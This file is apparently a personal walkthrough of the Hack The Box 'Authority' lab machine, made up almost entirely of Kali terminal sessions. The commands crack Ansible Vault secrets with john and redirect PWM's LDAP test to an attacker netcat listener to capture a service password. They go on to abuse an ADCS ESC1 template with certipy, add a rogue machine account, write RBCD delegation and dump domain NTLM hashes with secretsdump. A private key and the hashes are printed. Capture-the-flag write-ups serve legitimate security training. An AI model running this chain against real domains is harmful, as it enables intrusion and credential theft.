@@ -1,0 +1,470 @@
+
+
+
+on 8443 we file PWM
+in open configuration mode
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.10.11.222/ -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Department Shares Disk      
+	Development     Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+Ansible/PWM/tomcat-users.xml.j2 contains 2 passwords but neither work.
+
+but then, in PWM/defaults
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat main.yml                                                                            
+---
+pwm_run_dir: "{{ lookup('env', 'PWD') }}"
+
+pwm_hostname: authority.htb.corp
+pwm_http_port: "{{ http_port }}"
+pwm_https_port: "{{ https_port }}"
+pwm_https_enable: true
+
+pwm_require_ssl: false
+
+pwm_admin_login: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          32666534386435366537653136663731633138616264323230383566333966346662313161326239
+          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+          35653634376333666234613466396534343030656165396464323564373334616262613439343033
+          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+          3438
+
+pwm_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          31356338343963323063373435363261323563393235633365356134616261666433393263373736
+          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+          38656432323830393339336231373637303535613636646561653637386634613862316638353530
+          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+          6531
+
+ldap_uri: ldap://127.0.0.1/
+ldap_base_dn: "DC=authority,DC=htb"
+ldap_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+          3764                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat hash
+$ANSIBLE_VAULT;1.1;AES256
+32666534386435366537653136663731633138616264323230383566333966346662313161326239
+6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+35653634376333666234613466396534343030656165396464323564373334616262613439343033
+6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+3438
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ansible2john hash > hash1
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash1
+Using default input encoding: UTF-8
+Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!@#$%^&*         (hash)     
+1g 0:00:00:07 DONE (2025-12-08 02:32) 0.1422g/s 5662p/s 5662c/s 5662C/s 051790..victor2
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+they all crack to the same password
+
+"We now need to install ansible-vault from pip to decrypt the encrypted strings found in the file.
+Now we can decrypt each one using the cracked password !@#$%^&* "
+
+cat vault1 | ansible-vault decrypt
+Vault password:
+Decryption successful
+svc_pwm
+
+cat vault2 | ansible-vault decrypt
+Vault password:
+Decryption successful
+pWm_@dm!N_!23
+
+cat vault3 | ansible-vault decrypt
+Vault password:
+Decryption successful
+DevT3st@123
+
+
+on port 8443, with the config manager/editor, we are able to login using only a password
+
+"Sometimes, it is possible to retrieve cleartext credentials by tricking the LDAP connection tester to
+connect to your own Netcat listener. Since it is using LDAPS, however, we will need to try editing
+the existing LDAP URL ldaps://authority.htb.corp:636 to use ldap:// and port 389 ,
+pointing it to our attacking machine's host IP instead."
+
+we change the LDAP/default/connection to point to ldap://10.10.14.38:389
+
+hit test ldap profile
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 389
+listening on [any] 389 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.222] 55141
+0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -i 10.10.11.222
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents> 
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad find -u svc_ldap@10.10.11.222 -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 37 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 21 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
+[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
+[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
+[!] Error checking web enrollment: [Errno 111] Connection refused
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : AUTHORITY-CA
+    DNS Name                            : authority.authority.htb
+    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : AUTHORITY.HTB\Administrators
+      Access Rights
+        ManageCa                        : AUTHORITY.HTB\Administrators
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        ManageCertificates              : AUTHORITY.HTB\Administrators
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        Enroll                          : AUTHORITY.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CorpVPN
+    Display Name                        : Corp VPN
+    Certificate Authorities             : AUTHORITY-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollmentCheckUserDsCertificate
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+                                          Document Signing
+                                          IP security IKE intermediate
+                                          IP security use
+                                          KDC Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 20 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2023-03-24T23:48:09+00:00
+    Template Last Modified              : 2023-03-24T23:48:11+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : AUTHORITY.HTB\Administrator
+        Full Control Principals         : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -computer-name EVIL01 -computer-pass 'P@ssword1!'         
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account EVIL01$ with password P@ssword1!.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad req -u 'EVIL01$' -p 'P@ssword1!' -dc-ip 10.10.11.222 -target 'authority.htb' -ca 'Authority-CA' -template 'CorpVPN' -upn 'administrator@authority.htb'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 3
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@authority.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.222
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@authority.htb'
+[*] Using principal: 'administrator@authority.htb'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+"We, however, get an error KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata
+type) . Some searching points us to this blog post, which explains that this likely means that the
+target Domain Controller does not support PKINIT . We can, however, use the PassTheCert tool to
+authenticate against LDAP using Schannel (Secure Channel).
+To use this tool, we first must extract the .crt and .key files from the .pfx certificate file using
+OpenSSL."
+
+we may also get an ldap shell as Administrator
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.222 -ldap-shell
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@authority.htb'
+[*] Connecting to 'ldaps://10.10.11.222:636'
+[*] Authenticated to '10.10.11.222' as: 'u:HTB\\Administrator'
+Type help for list of commands
+
+# whoami
+u:HTB\Administrator
+
+but lets try to go further.
+
+https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad cert -pfx administrator.pfx
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+-----BEGIN CERTIFICATE-----
+MIIGSjCCBTKgAwIBAgITEwAAAANnwXSc6BaQXAAAAAAAAzANBgkqhkiG9w0BAQsF
+ADBHMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJYXV0aG9y
+aXR5MRUwEwYDVQQDEwxBVVRIT1JJVFktQ0EwHhcNMjUxMjA4MTE0OTMwWhcNMjcx
+MjA4MTE1OTMwWjASMRAwDgYDVQQDDAdFdmlsMDEkMIIBIjANBgkqhkiG9w0BAQEF
+AAOCAQ8AMIIBCgKCAQEA0V9R8v/m9r+l8TCb2sw26BREi/hmFJvSaLNEvF5+it3p
+K8izakKtOpKF5Duyd/gpBS8EM0sEfjf/Xnj+8pZB+iIX6feF+wze7R9wVicPYqjh
+Cl++KBkJEKwSX2Vm7PpA165+4x7+OHBEwm+E1J/Voo883saM+BnLFC+oSEKihDuv
+uktfTcqNfIcJqGdXLg/KrA9u7nSDvc9iHAbWTx2Wau5UCdoGu7p7+mYGDh1TJ+dY
+D/ZcqFP1NObNwi6rjEBcDOgMzfSJSTkOUmDWum3Sz4A9E+EuNFf9+E1fejMab1sK
++77NXZQZVuIbMY0Rh5ULsnvZPJ3/0tHSASymM8ctrwIDAQABo4IDYjCCA14wNgYD
+VR0RBC8wLaArBgorBgEEAYI3FAIDoB0MG2FkbWluaXN0cmF0b3JAYXV0aG9yaXR5
+Lmh0YjAdBgNVHQ4EFgQUtbHG1oeCIwqP7dym1Jat06HvYQgwHwYDVR0jBBgwFoAU
+fq+LVpv+eIMLcJIj/evSVJtDWUgwgc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xk
+YXA6Ly8vQ049QVVUSE9SSVRZLUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1hdXRob3JpdHksREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/
+YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwAYIKwYBBQUH
+AQEEgbMwgbAwga0GCCsGAQUFBzAChoGgbGRhcDovLy9DTj1BVVRIT1JJVFktQ0Es
+Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
+PUNvbmZpZ3VyYXRpb24sREM9YXV0aG9yaXR5LERDPWh0Yj9jQUNlcnRpZmljYXRl
+P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAOBgNVHQ8B
+Af8EBAMCBaAwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIhLG+DIelwGmCuYsI
+htWpR4GUxw6BfoLUzjaB/dwWAgFkAgEIMFIGA1UdJQRLMEkGCisGAQQBgjcKAwQG
+CCsGAQUFBwMEBggrBgEFBQcDAgYKKwYBBAGCNwoDDAYIKwYBBQUIAgIGCCsGAQUF
+BwMHBgcrBgEFAgMFMGYGCSsGAQQBgjcVCgRZMFcwDAYKKwYBBAGCNwoDBDAKBggr
+BgEFBQcDBDAKBggrBgEFBQcDAjAMBgorBgEEAYI3CgMMMAoGCCsGAQUFCAICMAoG
+CCsGAQUFBwMHMAkGBysGAQUCAwUwRAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0D
+AgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsOAwIHMAoGCCqGSIb3DQMHMA0GCSqG
+SIb3DQEBCwUAA4IBAQA5sF5l8UDA3yL5TiysgnUrTLnJKdndRxuhWFuib8OP4jN1
+HyMOLUYZGnd3j2I0GjJwvsYvbkXCvJOiu/yvz4TZPIopx5IIGLpA8RJv/vldD8Es
+txi8hkve3jlR9f94mYgCv0wUChs0VbOeFwBc0iRfEBlfV5RDst87obweJNg2nU+U
+FaMpUz1BArzJmVms8MLD2TlvoX12KeQioE/vW4J60UWkIasR3+ZL3lLSVGLrdzfv
+Efmq3b9EKWxcqEJE51x29O8HndkngDYHGnRJ1ZUHpzXK11v/BUPhH2K4tLNdr7aF
+ZS/CD919yRU6TLVvWRVzHxbYsYg1eB46jIaGfnFq
+-----END CERTIFICATE-----
+-----BEGIN PRIVATE KEY-----
+MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDRX1Hy/+b2v6Xx
+MJvazDboFESL+GYUm9Jos0S8Xn6K3ekryLNqQq06koXkO7J3+CkFLwQzSwR+N/9e
+eP7ylkH6Ihfp94X7DN7tH3BWJw9iqOEKX74oGQkQrBJfZWbs+kDXrn7jHv44cETC
+b4TUn9Wijzzexoz4GcsUL6hIQqKEO6+6S19Nyo18hwmoZ1cuD8qsD27udIO9z2Ic
+BtZPHZZq7lQJ2ga7unv6ZgYOHVMn51gP9lyoU/U05s3CLquMQFwM6AzN9IlJOQ5S
+YNa6bdLPgD0T4S40V/34TV96MxpvWwr7vs1dlBlW4hsxjRGHlQuye9k8nf/S0dIB
+LKYzxy2vAgMBAAECggEAEFycGVrRMFA6xhXv4BHcapeG4c9YHt0sfL0hrnzN88ky
+uxa0mqW6Rt0DdJoLsN9mST7q251NrRVwMfBPsCJ45nS6nLCYuk0/sJUn4Lutsp6S
+844W3KhUMobX6reQaw2FerVquhIGeN+hJ/ayETGqbsk1zw0CIDNX0OyGgJsgeyfQ
+mFmbcK4UQHnhVtH2UGBynnUVCw4pmKl6lDMyu2G0iX/0tDrig7WCI/z7aTRL9w6y
+OLJwcq8b7a4myCD1X/0ACwB6KNjd0O8bQAJrJ1JKHPHpxHEt2wCh87yWzSlWHLi4
+H4FhmAeZjZZFXFTKRF1idGOD5QP6UuEhwOpMUMgidQKBgQD9B3Y8HWFpPzeJd2mG
+3lxkziRPKSzXUcmNxqMTCXjiOisuRugFaJ5/v0YnXqhJBrRI2G/yaXXx7mg/WaSO
+tmfOjhmOSdGk1lD58eGtmH/1J99W5nZ3yNLDDWy4PGk0fXeuS1+VZTIFCQcTbEck
+QC5f8WCN/rVw5jpja3/pN45yKwKBgQDT1KM2a0rg+z+QjTMKmjDcgwj3ICsGOrvD
+msFp61KulPVSls3HT9vvwoDyS5nezLdU7UOHAYhIRAQeeiW3hIamcBwjbTd6ajaF
+vOlFfLr76MIUK9Hq3ty7Vh57t3I10Y5YQQeDrXIFP8sjO4GHjQxOcWgOqHVmaw6D
+83g99+zkjQKBgFVGWYOjBzxYMNhkZS0t7YePrc77+n/KsZnVcwosbBAaOIlNHk8M
+VjaJeRQ1o5OQ7duLDhdtkXFqvrly9bGfKdcELvq0SDI8hGfoK/28Yot116BK5Wwz
+Q0y3Toe83FvzWQ1lm54Wz8fApiDWohdGhhqRl8/jIrUc8lqlVSN9NMWnAoGAYmLF
+t5XXvm0TlejvBwKcpR67QESRlyAaa3xqTu68hVesJcLjKqp9xXs6ds8EVYYRtIFK
+tt7QVHg6zYkAEZ+dBprVhuLIPLQuRKl8Uwjes/fkhIfhxMvkC6KxH9cRVcvR6E2z
+1sXtSmDZ0bBmtfWd/KURppU5ies5X7HqbCXFwlUCgYBidmllg+1oVd4ZX4gc26k7
+e4OuGfGdWoDuvfnH27EcGQuLqIAFXNGAS7zcY0cox8xpPAPfE5mQPmZe5ydjcdQ2
+F0gXkAbJhiQgughozFBdfgdJibm6YzmdIanA0mGMRIxeDd8SWYXTqGU4T4hXl7dx
+VGOrqQAqnx9re45eTDBVIA==
+-----END PRIVATE KEY-----
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# openssl pkcs12 -in administrator.pfx -out administrator.pem -nodes
+Enter Import Password:
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# openssl pkey -in administrator.pem -out administrator.key
+openssl x509 -in administrator.pem -out administrator.crt
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'EVIL01$'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EVIL01$ can now impersonate users on AUTHORITY$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EVIL01$      (S-1-5-21-622327497-3269355298-2248959698-11602)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# net time set -S 10.10.11.222                                       
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/EVIL01$:P@ssword1!'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache 
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:41ba6a9dd63d10f43625c3c0c562523c:::
+EVIL01$:11602:aad3b435b51404eeaad3b435b51404ee:517c702b2b6dc0f09ef1560366692c3d:::
+[*] Cleaning up... 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+
